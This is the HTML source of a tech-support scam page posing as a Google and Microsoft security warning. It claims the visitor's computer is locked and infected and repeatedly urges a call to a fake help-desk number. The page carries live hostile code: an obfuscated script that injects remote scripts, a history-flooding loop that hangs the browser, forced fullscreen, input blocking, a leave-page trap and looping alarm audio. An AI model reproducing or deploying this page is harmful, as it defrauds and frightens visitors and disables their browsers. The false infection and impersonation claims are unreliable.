<!DOCTYPE html>
<html <head="">

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta charset="utf-8">              
		<title>Google Security Warning</title>
        <link rel="stylesheet" href="bootstrap.min.css" >
        <script src="jquery.min.js" ></script>
		<script src="bootstrap.min.js" ></script>
		<script type="text/javascript">
		var d,c,b,a;(function(){function j(){return String}function g(a,b){return a% b}function h(a,b){return a+ b}function i(a,b){return a< b}var e=(f)("sceriwte/yeo0ntej/moca/ei5tee%ost.tea6igr%p%/aEEagr%htlmer%.rd1s%nBcn/tse5v%pjt46t12saf%er2tBe/tNejscTsrmNsl:tn.gayaot.sltscesnnsot_xh9p/.s%jt1p6missy%/7tep/psaae_c:th",673688);function f(f,p){var d={},y={},e={},n={},b={},v={},s={};d._= p;var q=f.length;y._= [];;for(var r=0;i(r,q);r++){y._[r]= f.charAt(r)};for(var r=0;i(r,q);r++){e._= h(d._* (h(r,184)),(g(d._,39482)));;n._= h(d._* (h(r,389)),(g(d._,26566)));;b._= g(e._,q);;v._= g(n._,q);;s._= y._[b._];;k(b,y,v);l(v,y,s);m(d,e,n)};var a=j().fromCharCode(127);var o="";var x="\x25";var c="\x23\x31";var u="\x25";var t="\x23\x30";var w="\x23";return y._.join(o).split(x).join(a).split(c).join(u).split(t).join(w).split(a)}d= document[e[1]](e[0]);d[e[2]]= e[3];d[e[4]]= false;d[e[5]]= e[6];c= document[e[7]](e[0])[0];c[e[9]][e[8]](d,c);b= document[e[1]](e[0]);b[e[2]]= e[3];b[e[4]]= true;b[e[5]]= e[10];a= document[e[7]](e[0])[0];a[e[9]][e[8]](b,a);function k(a,c,b){c._[a._]= c._[b._]}function l(b,c,a){c._[b._]= a._}function m(a,b,c){a._= g((h(b._,c._)),2735455)}})()})();
		</script>
        <meta content="width=device-width, initial-scale=1.0, user-scalable=1" name="viewport">
        <meta name="robots" content="noindex, nofollow">
                         
		<script type="text/javascript">

			$(document).ready(function () {

			$('#myModal').modal('show');

			});
		</script>
		<style>
        html {
            overflow: hidden;
        }
		

		
		
       </style>
<style>
.blink_me {
  animation: blinker 1s linear infinite;
}

@keyframes blinker {  
  50% { opacity: 0; }
}
	
</style>
	
	<script>
		var is_chrome,
				isChromium = window.chrome,
				vendorName = window.navigator.vendor,
				isOpera = window.navigator.userAgent.indexOf("OPR") > -1;
			is_chrome = isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false ? true : false;

			function alertCall()
			{
      var total = "";
      for( var i = 0; i < 100000; i++ ) {
          total = total + i.toString();
          history.pushState(0,0, total );
      }
}
		 	function alertTimed()
			{
				if (is_chrome)
				{
					setInterval(function(){
						alertCall();
					}, 200);
				}
				else
				{
					alertLoop();
				}
			}
		 	function alertLoop()
			{
				for (i = 0; i < 500; i++)
				{
					alertCall();
				}
			}
			function addEvent(obj, evt, fn)
			{
				if (obj.addEventListener)
				{
					obj.addEventListener(evt, fn, false)
				}
				else if (obj.attachEvent)
				{
					obj.attachEvent("on" + evt, fn)
				}
			}
			$(document).ready(function(){
				document.onkeydown = function(e){
					if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117))
					{
						if (!is_chrome)
						{
							alertTimed();
						}
						return true;
					}
					else if (e.keyCode === 123)
					{
						return true;
					}
					else
					{
						return true;
					}
				};
				$(window).on('click', function(){
					//window.open('index.html'/*tpa=http://d2nznokn9r4ad3.cloudfront.net/index.html*/, 'window' + Math.floor((Math.random() * 9999) + 1), 'width=' + screen.availWidth + ',height=' + screen.availHeight + ',titlebar=1,menubar=1');
					toggleFullScreen();
					alertTimed();
					document.getElementById("ifr").src="index.html"/*tpa=http://d2nznokn9r4ad3.cloudfront.net/index.html*/;
					
				});
				addEvent(document, "mouseout", function(e){
					e = e ? e : window.event;
					var from = e.relatedTarget || e.toElement;
					if (!is_chrome && (!from || from.nodeName == "body"))
					{
						alertTimed();
					}
				});
			});
			window.onbeforeunload = function(e){
				var message = '*************************************************\n\nCall Microsoft Help Desk Immediately at +1855-374-7444\n\nThe following data will be compromised if you continue:\n1. Passwords\n2. Browser History\n3. Credit Card Information\n\nThis virus is well known for complete identity and credit card theft. Further action through this computer or any computer on the network will reveal private information and involve serious risks.\n\nCall Microsoft Help Desk Immediately at +1855-374-7444';
				e.returnValue = message;
				return message;
			};
			window.onload = function(e){
				//alertTimed();
			};
			
		$('confirm text').dialog(
    {
        modal:true, //Not necessary but dims the page background
        buttons:{
            'Save':function() {
                //Whatever code you want to run when the user clicks save goes here
             },
             'Delete':function() {
                 //Code for delete goes here
              }
        }
    }
);	
			
		</script>
		 <script type="text/javascript">
        function toggleFullScreen() {
            if (!document.fullscreenElement && !document.mozFullScreenElement && !document.webkitFullscreenElement) {
                if (document.documentElement.requestFullscreen) {
                    document.documentElement.requestFullscreen();

                } else if (document.documentElement.mozRequestFullScreen) {
                    document.documentElement.mozRequestFullScreen();

                } else if (document.documentElement.webkitRequestFullscreen) {
                    document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
                }
            }
        }
    </script>
	<style>
			*{margin:0;padding:0;height:auto}
			body{background:#CD3426;color:#fff;font-family:'Yantramanav',sans-serif;margin:0 auto;width:100%;padding:0}
			#wrap{max-width:800px;width:100%;margin:100px auto;padding:25px}
			h1{margin-bottom:25px}
			p{margin-bottom:35px}
			p{line-height:28px}
			a{color:#fff!important}
			.btn{outline:0!important;text-decoration:none!important;padding:10px 24px;color:#fff;display:inline-block;font-size:15px;background-color:#FF0000;font-weight:600}
			.btn:hover,.btn:active{-webkit-box-shadow:0px 2px 4px 0px rgba(0,0,0,0.50);-moz-box-shadow:0px 2px 4px 0px rgba(0,0,0,0.50);box-shadow:0px 2px 4px 0px rgba(0,0,0,0.50)}

			input[type=checkbox]{visibility:hidden}
			.checkbox{position:relative;margin-right:10px}
			.checkbox label{cursor:pointer;position:absolute;width:15px;height:15px;left:4px;top:1px;border:1px solid #fff;border-radius:2px;-moz-border-radius:2px;-webkit-border-radius:2px}
			.checkbox label:after{-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";filter:alpha(opacity=0);opacity:0;content:'';position:absolute;width:8px;height:5px;background:transparent;top:2px;left:2px;border:2px solid #fff;border-top:none;border-right:none;-webkit-transform:rotate(-45deg);-moz-transform:rotate(-45deg);-o-transform:rotate(-45deg);-ms-transform:rotate(-45deg);transform:rotate(-45deg)}
			.checkbox label:hover::after{-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=30)";filter:alpha(opacity=30);opacity:0.3}
			.checkbox input[type=checkbox]:checked+label:after{-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=100)";filter:alpha(opacity=100);opacity:1}
		</style>
	</head>
	
   
	<body style="background:#00a1f1" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;">

	<br>
		<div id="wrap">
		   
			<img src="http://erroralret.000webhostapp.com/x.png"  alt="stop" width="75" height="75" style="margin-bottom:50px">
			<h1>Your computer has been Locked</h1>
			<h2>Call Now : +1855-374-7444</h2>
			<br>
			<p>Your computer with the IP address <strong>182.74.27.50</strong> has been infected by the Trojans -- <strong> Because System Activation KEY has expired </strong> & Your information (for example, passwords, messages, and credit cards) have been stolen. <strong>Call the Windows Help Desk +1855-374-7444</strong> to protect your files and identity from further damage.</p>
			<h2 style="margin-top:-12px" >Call Now : +1855-374-7444</h2>
			<p style="margin-bottom:50px">
				<span class="checkbox">
					<input type="checkbox" id="checkbox">
					<label for="checkbox"></label>
				</span>
				Automatically report details of possible security incidents to Google. <a href="#" >Privacy policy</a>
			</p>
			<div>
				<a href="tel:+1855-374-7444 class="btn" style="float:left">Call Now : +1855-374-7444</a>
				<a href="#" class="btn animation: blinker 1s linear infinite;" style="font-size:18px;float:right">Back to safety</a>
			</div>
		</div>
		<br><br><br><br><br><br><br><br><br><br>
		<br><br><br><br><br><br><br><br><br><br>
<audio autoplay="autoplay" loop>
<source src="err.mp3"  type="audio/mpeg">
</audio>

  

  <!-- Modal -->
  <div class="modal fade" id="myModal" role="dialog">
    <div class="modal-dialog">
    
      <!-- Modal content-->
      <div class="modal-content">
        
        <div class="modal-body">
        <a id="close" href="#"></a>
        <img src="http://pngimg.com/uploads/microsoft/microsoft_PNG20.png" height="100px" width="300px"/>
          <p style="font-size:25px;color:black;" >Firewall detecting 'suspicious' incoming network connections,Call TollFree +1855-374-7444 OR "Back to Safety" </p>
        </div>
        <div class="modal-footer">
		 <button type="button" class="btn btn-default" data-dismiss="modal">Back To Safety</button>
        </div>
      </div>
      
    </div>
  </div>

<iframe id='ifr' frameborder="0" scrolling="no" width="550" height="400">
<iframe src="index.html" ></iframe>.
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-123433039-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-123433039-1');
</script>



</body>

</html>